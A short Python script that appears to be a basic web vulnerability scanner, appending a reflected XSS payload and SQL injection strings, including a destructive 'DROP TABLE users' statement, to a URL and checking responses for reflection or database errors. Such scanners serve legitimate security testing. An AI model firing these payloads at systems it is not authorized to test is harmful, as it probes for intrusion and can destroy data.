import requests

xss_payload = "<script>alert('xss')</script>"
sql_payloads = ["' OR '1'='1", "'; DROP TABLE users;--"]

def test_xss(url):
    r = requests.get(url + xss_payload)
    return "❗ XSS Found" if xss_payload in r.text else "✅ No XSS"

def test_sql(url):
    for p in sql_payloads:
        r = requests.get(url + p)
        if "mysql" in r.text.lower() or "syntax" in r.text.lower():
            return "❗ SQLi Found"
    return "✅ No SQLi"

def scan(url):
    print(test_xss(url))
    print(test_sql(url))
